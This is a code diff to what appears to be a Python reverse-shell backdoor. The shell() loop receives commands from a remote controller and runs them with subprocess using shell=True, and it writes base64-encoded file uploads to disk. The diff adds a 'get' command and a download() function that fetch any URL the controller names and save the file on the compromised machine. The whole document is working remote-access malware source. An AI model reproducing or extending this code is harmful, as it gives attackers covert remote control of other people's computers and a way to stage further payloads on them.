@@ -7,6 +7,9 @@ import os
 import shutil # screenshot
 import sys # use in copy function 
 import base64
+import requests
+
+
 
 
 
@@ -44,6 +47,15 @@ def reliable_rcv():
 
 
 
+def download(url):
+	get_response = requests.get(url)
+	file_name =  url.split("/")[-1]
+	with open(file_name, "wb") as out_file:
+		out_file.write(get_response.content)
+
+
+
+
 def shell():
 	while True:
 		command = reliable_rcv() # receive bytes
@@ -62,6 +74,12 @@ def shell():
 	                with open(command[7:], "wb") as fin:
                                 result = reliable_rcv()
 				fin.write(base64.b64decode(result))
+		elif command[:3] == "get":
+			try:
+				download(command[4:])
+				reliable_send("[+] Download File From Specified URL")
+			except:
+				reliable_send("[!!] Failed to Download the file")
 		else:
 			try:
 				process = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin=subprocess.PIPE)
